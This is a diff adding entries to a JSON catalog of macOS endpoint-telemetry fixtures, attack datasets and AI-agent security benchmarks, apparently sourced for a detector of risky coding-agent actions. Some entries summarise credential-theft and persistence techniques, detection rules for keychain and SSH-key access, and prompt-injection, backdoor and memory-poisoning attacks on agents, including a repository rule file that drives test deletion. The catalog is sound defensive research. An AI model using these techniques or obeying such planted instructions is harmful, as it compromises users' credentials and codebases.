+   "what": "27 trimmed eslogger records (time, global_seq_num, process, event only): 13 create, 9 unlink, 5 rename by bash, zsh, mv, rm, mkdir, rmdir, cp, ld, codesign. QA scenarios write ~/Library/LaunchAgents/qa-fl2.plist and rename it, a .bash_profile in a test dir, ~/qa-fl2-a.command, codesign .cstemp and qaout files under /private/tmp. Real vs synthetic not stated.",
+   "license": "MIT (LICENSE 'Copyright (c) 2026 ESDaemon contributors'; GitHub API spdx MIT; copied)",
+   "redistributable": "yes",
+   "published": "commit 8c6b47c4, 2026-10-29",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "create/rename/unlink, all visible.",
+   "how_to_use": "Small persistence-location positives (user LaunchAgent plist) and missing-field tolerance.",
+   "downloaded_to": [
+    "datasets/esdaemon-fixtures"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-156",
+   "name": "eslogger format fixtures from five tools (esl, tmc/misc, vigil, rustinel, agentjail)",
+   "url": "https://github.com/tstromberg/esl/tree/main/pkg/eslogger/testdata",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "One subdir per repo: tstromberg/esl pretty-printed eslogger JSON at msg v6 (Apache-2.0, 2023); tmc/misc eslog/sample.json 2 exec at v8 (MIT); hoknie/vigil exec.ndjson 4 exec v8 + fork.json (Apache-2.0); Karib0u/rustinel normalized ESF records (process_lifecycle 10, file_lifecycle 20; provenance says captured on macOS 27.0.1 arm64 2026-10-19; Apache-2.0); LuD1161/agentjail exec-sample.jsonl (4 events, v7), es.jsonl (5 lines), aw.jsonl (3 OTel shim records) and claude-strace.txt (strace of an interactive Claude Code session in a libkrun Linux guest, 2026-05-21) (Apache-2.0).",
+   "license": "Apache-2.0 / MIT per subdirectory (each LICENSE copied; SOURCE.txt lists commits)",
+   "redistributable": "yes",
+   "published": "2023-05-07 (esl) .. 2026-10-19 (rustinel capture)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "ES-native except rustinel (re-shaped), aw.jsonl (OTel), strace (Linux syscalls).",
+   "how_to_use": "Parser robustness across msg v6-v8 and pretty vs line-delimited output (nothing here is v10). The strace roughly maps files Claude Code touches at startup (Linux).",
+   "downloaded_to": [
+    "datasets/eslogger-format-fixtures"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-157",
+   "name": "Jamf Protect telemetry sample logs (ES-shaped, via Elastic integrations)",
+   "url": "https://github.com/elastic/integrations/tree/main/packages/jamf_protect/data_stream/telemetry/_dev/test/pipeline",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "Jamf Protect telemetry pipeline-test NDJSON (event.<type>, process, metadata, host) and expected ECS. test-jamf-protect-telemetry-sample-logs.log: 38 lines over 36 types, mostly ES-native (exec, btm_launch_item_add/remove, tcc_modify, sudo, su, od_*, login/logout, openssh_login, screensharing_attach, xp_malware_*, kextload, profile_add, gatekeeper_user_override, pty_*, mount, settime, cs_invalidate) plus Jamf-specific network_connect, file_collection, bios_uefi, system_performance. test-btm-app-priority.log: 3 BTM add/remove.",
+   "license": "Elastic-2.0 (package manifest source.license 'Elastic-2.0'; repo LICENSE.txt copied)",
+   "redistributable": "yes",
+   "published": "main a2c28c43, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "ES-native message shape from a second producer; btm_launch_item_add and tcc_modify match the subscription.",
+   "how_to_use": "Parser fixtures for btm_launch_item_add (item, instigator) and tcc_modify (identity, right, reason) as another producer writes them.",
+   "downloaded_to": [
+    "datasets/jamf-protect-telemetry-samples"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-158",
+   "name": "Mac Monitor (Red Canary) eslogger test fixtures and telemetry schema",
+   "url": "https://github.com/Brandon7CC/mac-monitor",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "From ProjectSutro/SutroESFrameworkTests/Fixtures and Schema at d89504af (v3.0.0 released 2026-11-02): 26 lines of eslogger JSONL at msg v10 (exit 1, open 1, lineage 8 exec + 2 fork via launchd/xpcproxy/zsh, OpenDirectory 11, remote_thread_create 2), Mac Monitor 2.1 export fixtures, eslogger-keys.json and mac-monitor-telemetry.schema.json marking each key eslogger- or Mac Monitor-origin. Lab fixtures.",
+   "license": "BSD-3-Clause (LICENSE 'Copyright (c) 2025, Red Canary, a Zscaler company'; GitHub API spdx BSD-3-Clause)",
+   "redistributable": "yes",
+   "published": "main d89504af, 2026-11-02",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "ES-native; only exec/fork/exit/open fall in the detector's subscription.",
+   "how_to_use": "Parser/schema conformance for msg v10; the schema explains Mac Monitor-flavoured exports such as es-malware-captures; lineage fixture checks launchd/xpcproxy reparenting.",
+   "downloaded_to": [
+    "datasets/mac-monitor-fixtures"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-159",
+   "name": "macOS-ATTACK-DATASET (Elastic Endpoint Security for macOS, 2021)",
+   "url": "https://github.com/sbousseaden/macOS-ATTACK-DATASET",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "66 JSON files of Elasticsearch hits in ECS from 2021 lab hosts; a lenient decoder gets ~78 records (process exec 50, end 5, fork 2; file modification 9, rename 5; 7 unclassified); 9 files malformed or partial. ATT&CK folders: persistence (bash_profile, authorized_keys, LaunchAgents/Daemons, hidden login item, cron, emond, vim plugin, login hook, periodic), credential access (browser cookies, keychain via security, Chrome debugging cookie theft), defense evasion (quarantine xattr removal, TCC bypass), discovery, execution, lateral movement, privesc. Records include lab host names.",
+   "license": "GPL-3.0 by reference (README links LICENSE.GPL in sbousseaden/EVTX-ATTACK-SAMPLES; no LICENSE file here; GitHub API none)",
+   "redistributable": "yes",
+   "published": "2021-01-12..2021-09-10",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Exec and file modification/rename map to eslogger exec/close/rename; Elastic enrichments do not.",
+   "how_to_use": "Positives for persistence-location and credential-file keep paths after reshaping ECS to eslogger. Small, old, not agent-related.",
+   "downloaded_to": [
+    "datasets/sbousseaden-macos-attack-dataset"
+   ],
+   "value": 2
+  },
+  {
+   "id": "SRC-160",
+   "name": "North Pole Security Santa telemetry testdata",
+   "url": "https://github.com/northpolesec/santa/tree/main/Source/santad/testdata",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "224 files; protobuf/v1..v8 hold Santa's JSON-rendered telemetry for ES-derived events (56 in v8): exec, fork, exit, close, rename, unlink, link, clone, copyfile, exchangedata, file_access, launch_item_add/remove (relative and null-app variants), tcc_modify (null-everything, null-trigger), login/openssh/screensharing/lw_session, gatekeeper, cs_invalidated, xp_*, authentication, proc_suspend_resume. binaryrules/ mixes in test binaries and C sources.",
+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "repo last pushed 2026-10-29",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Same ES events but in Santa's schema.",
+   "how_to_use": "Edge-case ideas for null fields in launch_item_add and tcc_modify. Not downloaded (binaries in tree); fetch only protobuf/v8/*.json if needed.",
+   "downloaded_to": [],
+   "value": 2
+  },
+  {
+   "id": "SRC-162",
+   "name": "Agent Security Bench (ASB)",
+   "url": "https://github.com/agiresearch/ASB",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "ICLR 2025 (arXiv 2410.02644) on AIOS: DPI, OPI, Plan-of-Thought backdoor and memory-poisoning attacks plus defenses across 10 simulated scenarios.",
+   "license": "MIT (GitHub API)",
+   "redistributable": "yes",
+   "published": "repo last push 2026-09-30",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-018",
+    "EAA-004"
+   ],
+   "eslogger_visible": "None (simulated).",
+   "how_to_use": "Taxonomy reference (memory poisoning).",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-163",
+   "name": "Agent-SafetyBench",
+   "url": "https://huggingface.co/datasets/thu-coai/Agent-SafetyBench",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "released_data.json: 2,000 cases (arXiv 2412.14470) with risks, instruction, environments, failure_modes, fulfillable; environments include OS 50, Github 32, FileManager 31, CodeAssistant 9.",
+   "license": "MIT (HF card; GitHub API)",
+   "redistributable": "yes",
+   "published": "HF 2025-08-11 (data released 2025-02-20)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-018"
+   ],
+   "eslogger_visible": "None as shipped; OS/FileManager instructions could be re-run for real.",
+   "how_to_use": "Mine ~80 OS/FileManager cases for unsafe file-op prompts. Low priority.",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-164",
+   "name": "AgentDojo",
+   "url": "https://github.com/ethz-spylab/agentdojo",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "Prompt-injection benchmark (NeurIPS 2024 D&B; ETH Zurich, Invariant Labs): workspace, slack, travel, banking suites (v1..v1_2_2), simulated tools.",
+   "license": "MIT (GitHub API)",
+   "redistributable": "yes",
+   "published": "repo last push 2026-06-02",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-018"
+   ],
+   "eslogger_visible": "None (simulated Python tools).",
+   "how_to_use": "Injection phrasing seeds only.",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-166",
+   "name": "CyberSecEval / PurpleLlama CybersecurityBenchmarks",
+   "url": "https://github.com/meta-llama/PurpleLlama",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "datasets/interpreter/interpreter.json (500 prompts: container escape, post exploitation, privesc, reflected attack, social engineering); mitre/mitre_benchmark_100_per_category_with_augmentation.json (1,000 prompts over 10 tactics); plus prompt_injection, autonomous_uplift, canary_exploit, mitre_frr, spear_phishing. Prompts only.",
+   "license": "MIT (CybersecurityBenchmarks/LICENSE, Meta); repo-level NOASSERTION",
+   "redistributable": "yes",
+   "published": "repo last push 2026-10-30",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015"
+   ],
+   "eslogger_visible": "Only if an agent runs generated code.",
+   "how_to_use": "Prompt seeds for generic attack runs; low priority.",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-167",
+   "name": "InjecAgent",
+   "url": "https://github.com/uiuc-kang-lab/InjecAgent",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "1,054 simulated indirect-injection cases (17 user tools, 62 attacker tools); attacker_cases_dh.jsonl (30), _ds.jsonl (32); one attacker case uses TerminalExecute (in 17 of 510 dh base cases). Outputs on Google Drive.",
+   "license": "MIT (GitHub API)",
+   "redistributable": "yes",
+   "published": "repo last push 2024-07-02",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-018"
+   ],
+   "eslogger_visible": "Only the TerminalExecute case maps to exec + file moves.",
+   "how_to_use": "Negligible.",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-170",
+   "name": "RepoGuardBench (repository-borne prompt injection vs local coding agents)",
+   "url": "https://github.com/DaoyuanLi2816/RepoGuardBench",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "ICML 2026 DL4C workshop: 80 core + 14 applied tasks with inert instructions in five carriers (README, issue, code comment, test log, agent-rule file), local Ollama models, one structured action per turn. Proposed-attempt rates: code comment 50.9%, rule file 45.8%, issue 13.7%, README/test log 0%; strict-sandbox completion 2.1%, dominated by rule-file-driven test deletion. data/repoguardbench_core.jsonl, _real.jsonl; result CSVs.",
+   "license": "Code MIT (LICENSE; GitHub API); data CC-BY-4.0 (LICENSE-DATA)",
+   "redistributable": "yes",
+   "published": "repo 2026-06-29..2026-10-03",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-018"
+   ],
+   "eslogger_visible": "Structured actions would be create/unlink/exec if run for real; sandbox actions are not real Mac processes.",
+   "how_to_use": "Carrier design (rule file -> test deletion) for a few cases.",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-171",
+   "name": "RiOSWorld (risk benchmark for multimodal computer-use agents)",
+   "url": "https://github.com/yjyddq/RiOSWorld",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "NeurIPS 2025 (arXiv 2506.00618), OSWorld-style Ubuntu risks (evaluation_risk_examples, e.g. phishing email); trajectories released as HF JY-Young/RiOSWorld trajectory_data.zip (2025-11-05).",
+   "license": "Apache-2.0 per README badge and HF card; GitHub API null",
+   "redistributable": "yes",
+   "published": "repo 2025-05-23..2025-12-02",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-018"
+   ],
+   "eslogger_visible": "Mostly screen/network-level risks; only file/command effects visible.",
+   "how_to_use": "Low value for a coding-agent detector.",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-172",
+   "name": "ToolEmu",
+   "url": "https://github.com/ryoungj/ToolEmu",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "144 curated cases (assets/all_cases.json: Toolkits, User Instruction, Underspecifications, Expected Achievements, Potential Risky Outcomes/Actions) in an LM-emulated sandbox; Terminal most common (30), Gmail 26.",
+   "license": "Apache-2.0 (GitHub API)",
+   "redistributable": "yes",
+   "published": "ICLR 2024; repo last push 2024-03-22",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Emulated; Terminal cases describe deletions/permission changes.",
+   "how_to_use": "30 Terminal cases as accidental-damage intent hard negatives.",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-173",
+   "name": "AiSOC detection fixtures",
+   "url": "https://github.com/beenuar/AiSOC/tree/main/detections/fixtures",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "detection-content",
+   "what": "2,676 tiny positive/negative fixtures; 118 macOS (57-167 bytes): flattened single events with event_type and placeholder path/argv values (not real paths). Rules: launchagent write, keychain DB read by other uid, security find-generic-password, osascript, csrutil, authorized_keys append. SIEM-level AI fixtures: ai-agent-excessive-agency, ai-agent-new-high-risk-tool, ai-shadow-agent-discovered, ai-prompt-contained-credential, ai-prompt-injection-detected, llm-copilot-agent-mcp-config-changed.",
+   "license": "MIT (GitHub API spdx MIT)",
+   "redistributable": "yes",
+   "published": "repo last pushed 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Only event type and placeholder path survive; no process context.",
+   "how_to_use": "Rule-name and path ideas only. Not downloaded.",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-175",
+   "name": "DeceptionPro EDR_Telemetry_Sample (Hugging Face)",
+   "url": "https://huggingface.co/datasets/DeceptionPro/EDR_Telemetry_Sample",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "Long-term malware detonation EDR telemetry from Deception.Pro sandbox runs on a live Windows AD network: hierarchical process trees enriched with network/DNS/file events; 16 files (~12 KB to 69 MB). Windows only.",
+   "license": "CC-BY-4.0 (dataset card front matter; API tag)",
+   "redistributable": "yes",
+   "published": "created 2026-04-15; modified 2026-05-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Not applicable (Windows).",
+   "how_to_use": "Not useful for the macOS detector. Not downloaded.",
+   "downloaded_to": [],
+   "value": 1
+  },
+  {
+   "id": "SRC-179",
+   "name": "Splunk attack_data macOS (osquery + endpoint security) datasets",
+   "url": "https://github.com/splunk/attack_data",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "macOS descriptors with sourcetype osquery:results, e.g. T1059.002/amos_stealer (2025-04-25, 'osquery and endpoint security'), T1059.002/osascript_do_shell_script (2026-09-03), T1555.001/osquery_keychains (2026-02-19). .log files are Git LFS pointers (1,079 bytes and 12,079 bytes); media.githubusercontent.com failed TLS from the sandbox, so contents unseen.",
+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "descriptors 2025-04-25..2026-09-03",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Unknown; if es_process_events/es_process_file_events rows, exec and file events map to eslogger. Not verified.",
+   "how_to_use": "Fetch the LFS logs from an unsandboxed host and check the table type. Tiny (a handful of rows each). Not downloaded.",
+   "downloaded_to": [],
+   "value": 1
+  }
+ ]
+}
